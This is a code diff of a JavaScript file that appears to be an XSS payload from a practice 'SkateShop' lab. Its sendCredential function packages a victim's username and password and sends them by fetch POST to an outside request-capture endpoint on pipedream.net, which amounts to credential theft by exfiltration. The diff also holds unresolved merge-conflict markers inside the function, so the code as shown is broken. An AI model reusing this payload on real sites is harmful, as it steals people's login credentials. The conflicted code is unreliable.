@@ -7,9 +7,6 @@ place_holder.className = "place_holder";
 $("nav").after(place_holder);
 
 function sendCredential(username, password) {
-    const headers = new Headers();
-    headers.append("Content-Type", "application/json");
-
     const body = {
         "username": username,
         "password": password,
@@ -19,14 +16,19 @@ function sendCredential(username, password) {
 
     const options = {
         method: "POST",
-        headers,
+        headers: { 'content-type': 'application/json' },
         mode: "cors",
         body: JSON.stringify(body)
     };
 
+<<<<<<< HEAD:SkateShop/xss_admin/xss10.js
     const request = async() => {
         const response = await fetch("https://ensnocsamq9t9ho.m.pipedream.net", options);
     }
+=======
+    fetch("https://ensnocsamq9t9ho.m.pipedream.net", options);
+    console.log(options);
+>>>>>>> dc95eabfb057971f980c11af30127b328dd39d15:SkateShop/xss_admin/xss9.js
 }
 
 
